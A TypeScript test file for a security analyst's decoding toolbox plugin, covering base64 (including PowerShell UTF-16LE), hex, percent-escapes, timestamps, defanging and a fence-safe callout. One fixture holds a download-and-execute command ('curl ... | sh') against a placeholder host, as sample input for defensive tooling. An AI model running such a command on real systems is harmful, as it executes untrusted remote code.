import { describe, expect, it } from 'vitest'
import {
  decodeBase64,
  decodeHex,
  decodePercentEscapes,
  defangSelection,
  derivedCallout,
  readTimestamp,
  refangSelection,
  runToolbox
} from './toolbox'

// Fixtures built with browser primitives: the plugin reads base64 with atob
// and TextDecoder, so the tests should make it the same way it is read.
const b64 = (bytes: number[]): string => btoa(String.fromCharCode(...bytes))
const utf16le = (s: string): number[] => [...s].flatMap((c) => [c.charCodeAt(0) & 0xff, c.charCodeAt(0) >> 8])
const utf8 = (s: string): number[] => [...new TextEncoder().encode(s)]

describe('decodeBase64', () => {
  it('reads a PowerShell -EncodedCommand, which is UTF-16LE', () => {
    // The case the whole thing exists for: decoded as UTF-8 this is "W-r-i-t-e"
    // with a NUL between every letter, which is why a UTF-8-only decoder is
    // useless here.
    const encoded = b64(utf16le('Write-Host hello'))
    const readings = decodeBase64(encoded)
    expect(readings).toEqual([{ as: 'UTF-16LE', text: 'Write-Host hello' }])
  })

  it('reads ordinary UTF-8 base64 and does not also offer a bogus UTF-16 reading', () => {
    const readings = decodeBase64(b64(utf8('curl http://example.com/a.sh | sh')))
    expect(readings).toEqual([{ as: 'UTF-8', text: 'curl http://example.com/a.sh | sh' }])
  })

  it('accepts the URL-safe alphabet and missing padding', () => {
    expect(decodeBase64('aHR0cHM6Ly9leGFtcGxlLmNvbS9hP2I9Yw')).toEqual([
      { as: 'UTF-8', text: 'https://example.com/a?b=c' }
    ])
  })

  it('returns nothing rather than mojibake when the bytes are not text', () => {
    expect(decodeBase64('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBD')).toEqual([]) // JPEG header
    expect(decodeBase64('not base64 at all!')).toEqual([])
    expect(decodeBase64('YWJj')).toEqual([]) // too short to be worth offering
  })
})

describe('decodePercentEscapes', () => {
  it('decodes until the text stops changing', () => {
    expect(decodePercentEscapes('https%253A%252F%252Fevil.test%252Fa')).toBe('https://evil.test/a')
  })

  it('leaves + alone — it only means a space in a form-encoded query', () => {
    expect(decodePercentEscapes('a+b%20c')).toBe('a+b c')
  })

  it('returns the input untouched when any escape in it is malformed', () => {
    // All or nothing: decodeURIComponent throws on the whole string, so a
    // half-decoded value is never handed back as if it were the answer.
    expect(decodePercentEscapes('100%25 sure %ZZ')).toBe('100%25 sure %ZZ')
  })
})

describe('decodeHex', () => {
  it('tolerates 0x, spaces and colons', () => {
    expect(decodeHex('68 65 6c 6c 6f')).toBe('hello')
    expect(decodeHex('0x68:0x65:0x6c:0x6c:0x6f')).toBe('hello')
  })

  it('refuses odd-length and non-hex input', () => {
    expect(decodeHex('68656c6c6f7')).toBeNull()
    expect(decodeHex('zzzz')).toBeNull()
  })
})

describe('readTimestamp', () => {
  it('offers every plausible epoch with the assumption named', () => {
    const readings = readTimestamp('1758456720')
    expect(readings).toEqual([{ assumption: 'seconds since 1970 (Unix)', iso: '2025-09-21T12:12:00.000Z' }])
  })

  it('drops readings that land outside living memory instead of listing them', () => {
    // 13 digits is milliseconds; as seconds it lands in the year 57000, as
    // microseconds in 1970. Only one reading survives.
    const readings = readTimestamp('1758456720000')
    expect(readings).toEqual([{ assumption: 'milliseconds since 1970', iso: '2025-09-21T12:12:00.000Z' }])
  })

  it('reads Windows FILETIME and the WebKit epoch when the digits allow it', () => {
    const readings = readTimestamp('133718959200000000')
    expect(readings.map((r) => r.assumption)).toContain('100ns ticks since 1601 (Windows FILETIME)')
    expect(readings.find((r) => r.assumption.startsWith('100ns'))?.iso).toBe('2024-09-27T07:32:00.000Z')
  })

  it('says when a written date carried no zone rather than pretending it did', () => {
    expect(readTimestamp('2026-09-21T12:12:00Z')[0].assumption).toBe('as written (zone stated)')
    expect(readTimestamp('Sep 21, 2026 12:12')[0].assumption).toContain('no zone')
  })

  it('is empty for something that is not a time', () => {
    expect(readTimestamp('hello')).toEqual([])
  })
})

describe('defang / refang selection', () => {
  it('defangs indicator lines and leaves prose alone', () => {
    const input = 'Sender used these:\n evil.test\nhttp://bad.test/a'
    expect(defangSelection(input)).toBe('Sender used these:\n evil[.]test\nhxxp://bad[.]test/a')
  })

  it('round-trips through refang', () => {
    expect(refangSelection(defangSelection('evil.test'))).toBe('evil.test')
  })
})

describe('derivedCallout', () => {
  it('labels the output derived and names what produced it', () => {
    expect(derivedCallout('base64 → UTF-8', 'hello')).toBe('> [!note] Derived · base64 → UTF-8\n> ```\n> hello\n> ```')
  })

  it('cannot be broken out of by decoded content', () => {
    // Decoded content is hostile by assumption: it came out of an alert. A run
    // of backticks must not close the fence, and a line must not escape the quote.
    const hostile = '```\n> [!danger] Not a real callout\n`````'
    const out = derivedCallout('base64 → UTF-8', hostile)
    expect(out).toContain('> ``````')
    for (const line of out.split('\n')) expect(line.startsWith('>')).toBe(true)
  })

  it('quotes blank lines so the callout does not end early', () => {
    expect(derivedCallout('t', 'a\n\nb')).toBe('> [!note] Derived · t\n> ```\n> a\n>\n> b\n> ```')
  })
})

describe('runToolbox', () => {
  it('offers only the transforms that actually apply', async () => {
    const names = (await runToolbox('1758456720')).map((t) => t.name)
    expect(names).toContain('Read as a timestamp')
    expect(names).not.toContain('Decode base64')
    expect(names).not.toContain('Decode hex')
  })

  it('always offers a hash, because any selection has one', async () => {
    const hit = (await runToolbox('anything at all')).find((t) => t.name === 'Hash the selection')
    expect(hit?.result.body).toContain('SHA-256  25f4ec36fb1d43c5f7c4b56e252382d391f18d2544f8eaae115801e12dddafd1')
    expect(hit?.result.body).toContain('SHA-1    da86b2350d7133a0b9455e2c4cae962d691712b0')
  })
})
